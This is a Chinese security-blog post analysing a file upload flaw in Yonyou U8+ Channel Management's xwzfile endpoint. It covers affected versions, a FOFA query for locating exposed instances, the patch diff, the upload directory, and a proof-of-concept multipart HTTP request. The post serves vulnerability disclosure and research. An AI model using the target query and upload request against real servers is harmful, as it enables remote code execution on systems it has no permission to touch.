---
title: "用友U8+渠道管理(高级版) xwzfile 文件上传漏洞"
source: https://mrxn.net/jswz/yonyou-xwzfile-upload-rce.html
asset_dir: assets/用友u8+渠道管理(高级版)-xwzfile-文件上传漏洞
---

# 用友U8+渠道管理(高级版) xwzfile 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/22 10:17
* 1279浏览
* [6评论](#comment)
* 14分钟阅读

深入探索

软件

服务器

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)U8+是用友网络科技股份有限公司推出的企业管理综合平台，广泛应用于财务、进销存、人力资源等企业核心业务系统中。在U8+渠道管理（高级版）模块中，存在一处[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，位于其 `xwzfile` 接口。攻击者可通过构造特定的HTTP请求，将恶意脚本或可执行文件上传至服务器。该漏洞可能导致攻击者在目标服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而获取服务器控制权限，进一步窃取敏感数据、篡改业务数据或对内网其他系统发起攻击。

漏洞预警服务

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V15.0, V13

# fofa语法

> title="渠道管理（高级版）"

# 漏洞分析

根据补丁变化

[![用友U8+渠道管理(高级版) xwzfile 文件上传漏洞](images/img-001-24c8de250da2.webp)](https://image.mrxn.net/1bae07efe9c04506b576186a6e75bb6a.webp)

直接看 `UploadWedgeServlet` 在那里引用了

计算机服务器

深入探索

防火墙软件

漏洞修复方案

数据库

```
    <!-- 新万泽费用报销单附件接口 -->
    <servlet>
        <servlet-name>UploadWedgeServlet</servlet-name>
        <servlet-class>com.gxfcsoft.framework.core.UploadWedgeServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>UploadWedgeServlet</servlet-name>
        <url-pattern>*.xwzfile</url-pattern>
    </servlet-mapping>
```

ok，根据servlet的映射，任意以`.xwzfile` 结尾的请求都会经由`UploadWedgeServlet` 处理，跟进看下它的实现逻辑,看补丁修复也是正则白名单检测

[![用友U8+渠道管理(高级版) xwzfile 文件上传漏洞](images/img-002-d8bfbde72161.webp)](https://image.mrxn.net/c5e0c3893e514d69bc45c52ba4fc7109.webp)

保存文件名为上传的文件原名，无任何其他操作，期间对文件类型和内容无校验或过滤，因此造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，非常朴实无华！和[U8+渠道管理(高级版) imagedo 文件上传漏洞](https://mrxn.net/jswz/yonyou-imagedo-upload-rce.html)一模一样的漏洞成因！

漏洞预警服务

# 漏洞复现

```
POST /temp.xwzfile HTTP/1.1
Host: u8.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.PNG"

TEST
------WebKitFormBoundary--
```

[![用友U8+渠道管理(高级版) xwzfile 文件上传漏洞](images/img-003-84aa7066cbdb.webp)](https://image.mrxn.net/8fb74229788e43c2b10ac708839dadc4.webp)

根据**getAttachAbsoluteDirectory**方法可知

[![用友U8+渠道管理(高级版) xwzfile 文件上传漏洞](images/img-004-c1cf252dc977.webp)](https://image.mrxn.net/236b1c1367524a398658a853f084a324.webp)

上传位置默认为 `/userfile/default/attach/` 目录下，访问上传文件

[![用友U8+渠道管理(高级版) xwzfile 文件上传漏洞](images/img-005-95ec4d9d54b2.webp)](https://image.mrxn.net/d43f653249de406f8431be7bb11f7da0.webp)

成功[执行我们上传代码](https://mrxn.net/tag/rce)

官方补丁修复也很直接，直接正则检测后缀是否为白名单

[![用友U8+渠道管理(高级版) xwzfile 文件上传漏洞](images/img-006-1bb82a028fb1.webp)](https://image.mrxn.net/9614b486c0554bab81151ae18ed534d9.webp)

# 参考

* [关于U8+渠道管理(高级版)存在文件上传漏洞的公告](https://security.yonyou.com/#/noticeInfo?id=727)
* <https://security.yonyou.com/#/patchInfo?identifier=29c55387e6274480b613343d8ffcd4e2>

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友U8+渠道管理(高级版) xwzfile 文件上传漏洞](https://mrxn.net/jswz/yonyou-xwzfile-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/yonyou-xwzfile-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

Windows安全工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-xwzfile-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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